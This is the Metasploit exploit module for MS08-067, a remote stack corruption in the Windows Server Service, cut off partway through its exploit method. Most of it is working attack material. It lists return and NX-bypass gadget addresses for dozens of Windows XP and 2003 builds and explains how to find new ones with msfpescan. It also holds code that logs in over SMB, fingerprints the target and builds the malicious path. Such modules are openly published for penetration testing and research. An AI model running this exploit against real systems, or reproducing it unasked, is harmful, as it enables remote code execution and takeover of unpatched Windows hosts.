##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS08-067 Microsoft Server Service Relative Path Stack Corruption',
      'Description'    => %q{
          This module exploits a parsing flaw in the path canonicalization code of
        NetAPI32.dll through the Server Service. This module is capable of bypassing
        NX on some operating systems and service packs. The correct target must be
        used to prevent the Server Service (along with a dozen others in the same
        process) from crashing. Windows XP targets seem to handle multiple successful
        exploitation events, but 2003 targets will often crash or hang on subsequent
        attempts. This is just the first version of this module, full support for
        NX bypass on 2003, along with other platforms, is still in development.
      },
      'Author'         =>
        [
          'hdm', # with tons of input/help/testing from the community
          'Brett Moore <brett.moore[at]insomniasec.com>',
          'frank2 <frank2[at]dc949.org>', # check() detection
          'jduck', # XP SP2/SP3 AlwaysOn DEP bypass
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          %w(CVE 2008-4250),
          %w(OSVDB 49243),
          %w(MSB MS08-067),
          # If this vulnerability is found, ms08-67 is exposed as well
          ['URL', 'http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 408,
          'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
          'Prepend'  => "\x81\xE4\xF0\xFF\xFF\xFF", # stack alignment
          'StackAdjustment' => -3500,

        },
      'Platform'       => 'win',
      'DefaultTarget'  => 0,
      'Targets'        =>
        [
          #
          # Automatic targetting via fingerprinting
          #
          ['Automatic Targeting', { 'auto' => true }],

          #
          # UNIVERSAL TARGETS
          #

          #
          # Antoine's universal for Windows 2000
          # Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET
          #
          ['Windows 2000 Universal',
           {
             'Ret'       => 0x001f1cb0,
             'Scratch'   => 0x00020408,
           }
          ], # JMP EDI SVCHOST.EXE

          #
          # Standard return-to-ESI without NX bypass
          # Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET
          #
          ['Windows XP SP0/SP1 Universal',
           {
             'Ret'       => 0x01001361,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI SVCHOST.EXE

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP0 Universal',
           {
             'Ret'       => 0x0100129e,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI SVCHOST.EXE

          #
          # ENGLISH TARGETS
          #

          # jduck's AlwaysOn NX Bypass for XP SP2
          ['Windows XP SP2 English (AlwaysOn NX)',
           {
             # No pivot is needed, we drop into our rop
             'Scratch' => 0x00020408,
             'UseROP'  => '5.1.2600.2180'
           }
          ],

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 English (NX)',
           {
             'Ret'       => 0x6f88f727,
             'DisableNX' => 0x6f8916e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # jduck's AlwaysOn NX Bypass for XP SP3
          ['Windows XP SP3 English (AlwaysOn NX)',
           {
             # No pivot is needed, we drop into our rop
             'Scratch' => 0x00020408,
             'UseROP'  => '5.1.2600.5512'
           }
          ],

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 English (NX)',
           {
             'Ret'       => 0x6f88f807,
             'DisableNX' => 0x6f8917c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          #
          # NON-ENGLISH TARGETS - AUTOMATICALLY GENERATED
          #

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Arabic (NX)',
           {
             'Ret'       => 0x6fd8f727,
             'DisableNX' => 0x6fd916e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Chinese - Traditional / Taiwan (NX)',
           {
             'Ret'       => 0x5860f727,
             'DisableNX' => 0x586116e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Chinese - Simplified (NX)',
           {
             'Ret'       => 0x58fbf727,
             'DisableNX' => 0x58fc16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Chinese - Traditional (NX)',
           {
             'Ret'       => 0x5860f727,
             'DisableNX' => 0x586116e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Czech (NX)',
           {
             'Ret'       => 0x6fe1f727,
             'DisableNX' => 0x6fe216e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Danish (NX)',
           {
             'Ret'       => 0x5978f727,
             'DisableNX' => 0x597916e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 German (NX)',
           {
             'Ret'       => 0x6fd9f727,
             'DisableNX' => 0x6fda16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Greek (NX)',
           {
             'Ret'       => 0x592af727,
             'DisableNX' => 0x592b16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Spanish (NX)',
           {
             'Ret'       => 0x6fdbf727,
             'DisableNX' => 0x6fdc16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Finnish (NX)',
           {
             'Ret'       => 0x597df727,
             'DisableNX' => 0x597e16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 French (NX)',
           {
             'Ret'       => 0x595bf727,
             'DisableNX' => 0x595c16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Hebrew (NX)',
           {
             'Ret'       => 0x5940f727,
             'DisableNX' => 0x594116e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Hungarian (NX)',
           {
             'Ret'       => 0x5970f727,
             'DisableNX' => 0x597116e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Italian (NX)',
           {
             'Ret'       => 0x596bf727,
             'DisableNX' => 0x596c16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Japanese (NX)',
           {
             'Ret'       => 0x567fd3be,
             'DisableNX' => 0x568016e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Korean (NX)',
           {
             'Ret'       => 0x6fd6f727,
             'DisableNX' => 0x6fd716e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Dutch (NX)',
           {
             'Ret'       => 0x596cf727,
             'DisableNX' => 0x596d16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Norwegian (NX)',
           {
             'Ret'       => 0x597cf727,
             'DisableNX' => 0x597d16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Polish (NX)',
           {
             'Ret'       => 0x5941f727,
             'DisableNX' => 0x594216e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Portuguese - Brazilian (NX)',
           {
             'Ret'       => 0x596ff727,
             'DisableNX' => 0x597016e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Portuguese (NX)',
           {
             'Ret'       => 0x596bf727,
             'DisableNX' => 0x596c16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Russian (NX)',
           {
             'Ret'       => 0x6fe1f727,
             'DisableNX' => 0x6fe216e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Swedish (NX)',
           {
             'Ret'       => 0x597af727,
             'DisableNX' => 0x597b16e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP2 Turkish (NX)',
           {
             'Ret'       => 0x5a78f727,
             'DisableNX' => 0x5a7916e2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Arabic (NX)',
           {
             'Ret'       => 0x6fd8f807,
             'DisableNX' => 0x6fd917c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Chinese - Traditional / Taiwan (NX)',
           {
             'Ret'       => 0x5860f807,
             'DisableNX' => 0x586117c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Chinese - Simplified (NX)',
           {
             'Ret'       => 0x58fbf807,
             'DisableNX' => 0x58fc17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Chinese - Traditional (NX)',
           {
             'Ret'       => 0x5860f807,
             'DisableNX' => 0x586117c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Czech (NX)',
           {
             'Ret'       => 0x6fe1f807,
             'DisableNX' => 0x6fe217c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Danish (NX)',
           {
             'Ret'       => 0x5978f807,
             'DisableNX' => 0x597917c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 German (NX)',
           {
             'Ret'       => 0x6fd9f807,
             'DisableNX' => 0x6fda17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Greek (NX)',
           {
             'Ret'       => 0x592af807,
             'DisableNX' => 0x592b17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Spanish (NX)',
           {
             'Ret'       => 0x6fdbf807,
             'DisableNX' => 0x6fdc17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Finnish (NX)',
           {
             'Ret'       => 0x597df807,
             'DisableNX' => 0x597e17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 French (NX)',
           {
             'Ret'       => 0x595bf807,
             'DisableNX' => 0x595c17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Hebrew (NX)',
           {
             'Ret'       => 0x5940f807,
             'DisableNX' => 0x594117c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Hungarian (NX)',
           {
             'Ret'       => 0x5970f807,
             'DisableNX' => 0x597117c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Italian (NX)',
           {
             'Ret'       => 0x596bf807,
             'DisableNX' => 0x596c17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Japanese (NX)',
           {
             'Ret'       => 0x567fd4d2,
             'DisableNX' => 0x568017c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Korean (NX)',
           {
             'Ret'       => 0x6fd6f807,
             'DisableNX' => 0x6fd717c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Dutch (NX)',
           {
             'Ret'       => 0x596cf807,
             'DisableNX' => 0x596d17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Norwegian (NX)',
           {
             'Ret'       => 0x597cf807,
             'DisableNX' => 0x597d17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Polish (NX)',
           {
             'Ret'       => 0x5941f807,
             'DisableNX' => 0x594217c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Portuguese - Brazilian (NX)',
           {
             'Ret'       => 0x596ff807,
             'DisableNX' => 0x597017c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Portuguese (NX)',
           {
             'Ret'       => 0x596bf807,
             'DisableNX' => 0x596c17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Russian (NX)',
           {
             'Ret'       => 0x6fe1f807,
             'DisableNX' => 0x6fe217c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Swedish (NX)',
           {
             'Ret'       => 0x597af807,
             'DisableNX' => 0x597b17c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          # Metasploit's NX bypass for XP SP2/SP3
          ['Windows XP SP3 Turkish (NX)',
           {
             'Ret'       => 0x5a78f807,
             'DisableNX' => 0x5a7917c2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

          #
          # Windows 2003 Targets
          #

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP1 English (NO NX)',
           {
             'Ret'       => 0x71bf21a2,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP1
          ['Windows 2003 SP1 English (NX)',
           {
             'RetDec'    => 0x7c90568c,  # dec ESI, ret @SHELL32.DLL
             'RetPop'    => 0x7ca27cf4,  # push ESI, pop EBP, ret @SHELL32.DLL
             'JmpESP'    => 0x7c86fed3,  # jmp ESP @NTDLL.DLL
             'DisableNX' => 0x7c83e413,  # NX disable @NTDLL.DLL
             'Scratch'   => 0x00020408,
           }
          ],

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP1 Japanese (NO NX)',
           {
             'Ret'       => 0x71a921a2,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP1 Spanish (NO NX)',
           {
             'Ret'       => 0x71ac21a2,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP1
          ['Windows 2003 SP1 Spanish (NX)',
           {
             'RetDec'    => 0x7c90568c,  # dec ESI, ret @SHELL32.DLL
             'RetPop'    => 0x7ca27cf4,  # push ESI, pop EBP, ret @SHELL32.DLL
             'JmpESP'    => 0x7c86fed3,  # jmp ESP @NTDLL.DLL
             'DisableNX' => 0x7c83e413,  # NX disable @NTDLL.DLL
             'Scratch'   => 0x00020408,
           }
          ],
          # Standard return-to-ESI without NX bypass
          # Added by Omar MEZRAG - 0xFFFFFF
          [ 'Windows 2003 SP1 French (NO NX)',
            {
              'Ret'       => 0x71ac1c40 ,
              'Scratch'   => 0x00020408
            }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP1
          # Added by Omar MEZRAG - 0xFFFFFF
          [ 'Windows 2003 SP1 French (NX)',
            {
              'RetDec'    => 0x7CA2568C,  # dec ESI, ret @SHELL32.DLL
              'RetPop'    => 0x7CB47CF4,  # push ESI, pop EBP, ret 4 @SHELL32.DLL
              'JmpESP'    => 0x7C98FED3,  # jmp ESP @NTDLL.DLL
              'DisableNX' => 0x7C95E413,  # NX disable @NTDLL.DLL
              'Scratch'   => 0x00020408
            }
          ],

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP2 English (NO NX)',
           {
             'Ret'       => 0x71bf3969,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP2
          ['Windows 2003 SP2 English (NX)',
           {
             'RetDec'    => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL
             'RetPop'    => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
             'JmpESP'    => 0x7c86a01b,  # jmp ESP @NTDLL.DLL
             'DisableNX' => 0x7c83f517,  # NX disable @NTDLL.DLL
             'Scratch'   => 0x00020408,
           }
          ],
#my add
[ 'Windows 2003 SP2 Chinese (NX)',
{
'RetDec'    => 0x7c99beb8,  # dec ESI, ret @NTDLL.DLL (0x4EC3)
'RetPop'    => 0x7cb5e84e,  # push ESI, pop EBP, ret @SHELL32.DLL(0x565DC3)
'JmpESP'    => 0x7c99a01b,  # jmp ESP @NTDLL.DLL(0xFFE4)
'DisableNX' => 0x7c96f517,  # NX disable @NTDLL.DLL
'Scratch'   => 0x00020408,
}
],

          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP2 German (NO NX)',
           {
             'Ret'       => 0x71a03969,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP2
          ['Windows 2003 SP2 German (NX)',
           {
             'RetDec'    => 0x7c98beb8,  # dec ESI, ret @NTDLL.DLL
             'RetPop'    => 0x7cb3e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
             'JmpESP'    => 0x7c98a01b,  # jmp ESP @NTDLL.DLL
             'DisableNX' => 0x7c95f517,  # NX disable @NTDLL.DLL
             'Scratch'   => 0x00020408,
           }
          ],

          # Brett Moore's crafty NX bypass for 2003 SP2 (target by Anderson Bargas)
          [ 'Windows 2003 SP2 Portuguese - Brazilian (NX)',
            {
              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL OK
              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL OK
              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL OK
              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL
              'Scratch'   => 0x00020408,
            }
          ],
          # Standard return-to-ESI without NX bypass
          ['Windows 2003 SP2 Spanish (NO NX)',
           {
             'Ret'       => 0x71ac3969,
             'Scratch'   => 0x00020408,
           }
          ], # JMP ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP2
          ['Windows 2003 SP2 Spanish (NX)',
           {
             'RetDec'    => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL
             'RetPop'    => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
             'JmpESP'    => 0x7c86a01b,  # jmp ESP @NTDLL.DLL
             'DisableNX' => 0x7c83f517,  # NX disable @NTDLL.DLL
             'Scratch'   => 0x00020408,
           }
          ],

          # Standard return-to-ESI without NX bypass
          # Provided by Masashi Fujiwara
          ['Windows 2003 SP2 Japanese (NO NX)',
           {
             'Ret'       => 0x71a91ed2,
             'Scratch'   => 0x00020408
           }
          ], # JMP ESI WS2HELP.DLL
          # Standard return-to-ESI without NX bypass
          # Added by Omar MEZRAG - 0xFFFFFF
          [ 'Windows 2003 SP2 French (NO NX)',
            {
              'Ret'       => 0x71AC2069,
              'Scratch'   => 0x00020408
            }
          ], # CALL ESI WS2HELP.DLL

          # Brett Moore's crafty NX bypass for 2003 SP2
          # Added by Omar MEZRAG - 0xFFFFFF
          [ 'Windows 2003 SP2 French (NX)',
            {
              'RetDec'    => 0x7C98BEB8,  # dec ESI, ret @NTDLL.DLL
              'RetPop'    => 0x7CB3E84E,  # push ESI, pop EBP, ret @SHELL32.DLL
              'JmpESP'    => 0x7C98A01B,  # jmp ESP @NTDLL.DLL
              'DisableNX' => 0x7C95F517,  # NX disable @NTDLL.DLL
              'Scratch'   => 0x00020408
            }
          ],

          #
          # Missing Targets
          # Key:   T=TODO   ?=UNKNOWN   U=UNRELIABLE
          #
          # [?] Windows Vista SP0 - Not tested yet
          # [?] Windows Vista SP1 - Not tested yet
          #
        ],

      'DisclosureDate' => 'Oct 28 2008'))

    register_options(
      [
        OptString.new('SMBPIPE', [true,  'The pipe name to use (BROWSER, SRVSVC)', 'BROWSER']),
      ], self.class)
  end

  #
  #
  #   *** WINDOWS XP SP2/SP3 TARGETS ***
  #
  #
  #   This exploit bypasses NX/NX by returning to a function call inside acgenral.dll that disables NX
  #   for the process and then returns back to a call ESI instruction. These addresses are different
  #   between operating systems, service packs, and language packs, but the steps below can be used to
  #   add new targets.
  #
  #
  #   If the target system does not have NX/NX, just place a "call ESI" return into both the Ret	and
  #   DisableNX elements of the target hash.
  #
  #   If the target system does have NX/NX, obtain a copy of the acgenral.dll from that system.
  #   First obtain the value for the Ret element of the hash with the following command:
  #
  #   $ msfpescan -j esi acgenral.dll
  #
  #   Pick whatever address you like, just make sure it does not contain 00 0a 0d 5c 2f or 2e.
  #
  #   Next, find the location of the function we use to disable NX. Use the following command:
  #
  #   $ msfpescan -r "\x6A\x04\x8D\x45\x08\x50\x6A\x22\x6A\xFF" acgenral.dll
  #
  #   This address should be placed into the DisableNX element of the target hash.
  #
  #   The Scratch element of 0x00020408 should work on all versions of Windows
  #
  #   The actual function we use to disable NX looks like this:
  #
  #     push    4
  #     lea     eax, [ebp+arg_0]
  #     push    eax
  #     push    22h
  #     push    0FFFFFFFFh
  #     mov     [ebp+arg_0], 2
  #     call    ds:__imp__NtSetInformationProcess@16
  #
  #
  #   *** WINDOWS XP NON-NX TARGETS ***
  #
  #
  #   Instead of bypassing NX, just return directly to a "JMP ESI", which takes us to the short
  #   jump, and finally the shellcode.
  #
  #
  #   *** WINDOWS 2003 SP2 TARGETS ***
  #
  #
  #   There are only two possible ways to return to NtSetInformationProcess on Windows 2003 SP2,
  #   both of these are inside NTDLL.DLL and use a return method that is not directly compatible
  #   with our call stack. To solve this, Brett Moore figured out a multi-step return call chain
  #   that eventually leads to the NX bypass function.
  #
  #
  #   *** WINDOWS 2000 TARGETS ***
  #
  #
  #   No NX to bypass, just return directly to a "JMP EDX", which takes us to the short
  #   jump, and finally the shellcode.
  #
  #
  #   *** WINDOWS VISTA TARGETS ***
  #
  #   Currently untested, will involve ASLR and NX, should be fun.
  #
  #
  #   *** NetprPathCanonicalize IDL ***
  #
  #
  #   NET_API_STATUS NetprPathCanonicalize(
  #   [in, string, unique] SRVSVC_HANDLE ServerName,
  #   [in, string] WCHAR* PathName,
  #   [out, size_is(OutbufLen)] unsigned char* Outbuf,
  #   [in, range(0,64000)] DWORD OutbufLen,
  #   [in, string] WCHAR* Prefix,
  #   [in, out] DWORD* PathType,
  #   [in] DWORD Flags
  #   );
  #

  def exploit
    begin
      connect
      smb_login
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      if e.message =~ /Connection reset/
        print_error('Connection reset during login')
        print_error('This most likely means a previous exploit attempt caused the service to crash')
        return
      else
        raise e
      end
    end

    # Use a copy of the target
    mytarget = target

    if target['auto']

      mytarget = nil

      print_status('Automatically detecting the target...')
      fprint = smb_fingerprint

      print_status("Fingerprint: #{fprint['os']} - #{fprint['sp']} - lang:#{fprint['lang']}")

      # Bail early on unknown OS
      if (fprint['os'] == 'Unknown')
        fail_with(Failure::NoTarget, 'No matching target')
      end

      # Windows 2000 is mostly universal
      if (fprint['os'] == 'Windows 2000')
        mytarget = targets[1]
      end

      # Windows XP SP0/SP1 is mostly universal
      if fprint['os'] == 'Windows XP' and fprint['sp'] == 'Service Pack 0 / 1'
        mytarget = targets[2]
      end

      # Windows 2003 SP0 is mostly universal
      if fprint['os'] == 'Windows 2003' and fprint['sp'].empty?
        mytarget = targets[3]
      end

      # Windows 2003 R2 is treated the same as 2003
      if (fprint['os'] == 'Windows 2003 R2')
        fprint['os'] = 'Windows 2003'
      end

      # Service Pack match must be exact
      if (not mytarget) and fprint['sp'].index('+')
        print_error('Could not determine the exact service pack')
        print_status("Auto-targeting failed, use 'show targets' to manually select one")
        disconnect
        return
      end

      # Language Pack match must be exact or we default to English
      if (not mytarget) and fprint['lang'] == 'Unknown'
        print_status('We could not detect the language pack, defaulting to English')
        fprint['lang'] = 'English'
      end

      # Normalize the service pack string
      fprint['sp'].gsub!(/Service Pack\s+/, 'SP')

      unless mytarget
        targets.each do |t|
          # Prefer AlwaysOn NX over NX, and NX over non-NX
          if t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} \(AlwaysOn NX\)/
            mytarget = t
            break
          end
          if t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} \(NX\)/
            mytarget = t
            break
          end
        end
      end

      unless mytarget
        fail_with(Failure::NoTarget, 'No matching target')
      end

      print_status("Selected Target: #{mytarget.name}")
    end

    #
    # Build the malicious path name
    #

    padder = [*('A'..'Z')]
    pad = 'A'
    while pad.length < 7
      c = padder[rand(padder.length)]
      next if pad.index(c)
      pad += c
    end

    prefix = '\\'
    path   = ''
    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase

    #
    # Windows 2003 SP2 (NX) targets
    #
    if mytarget['RetDec']

      jumper = Rex::Text.rand_text_alpha(70).upcase
